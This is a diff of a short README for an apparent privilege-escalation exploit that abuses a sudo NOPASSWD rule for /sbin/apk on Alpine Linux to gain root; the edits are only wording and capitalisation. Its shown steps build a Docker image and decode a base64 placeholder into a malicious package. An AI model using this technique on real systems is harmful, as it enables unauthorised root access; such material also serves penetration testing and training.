@@ -1,5 +1,5 @@
 # privesc-sudo-l-apk
-Exploit Privilege Escalation Alpine (root) NOPASSWD: /sbin/apk
+`sudo -l` Exploit Privilege Escalation Alpine (root) NOPASSWD: /sbin/apk
 
 ## Build APK
 
@@ -8,7 +8,7 @@ docker build --no-cache --platform=linux/amd64 -t exploit-sudo-l-apk .
 docker run -it --platform=linux/amd64 exploit-sudo-l-apk
 ```
 
-## Install apk exploit
+## Install APK Exploit
 
 ```bash
 echo <base64-encoded-apk> | base64 -d > nopasswd.apk
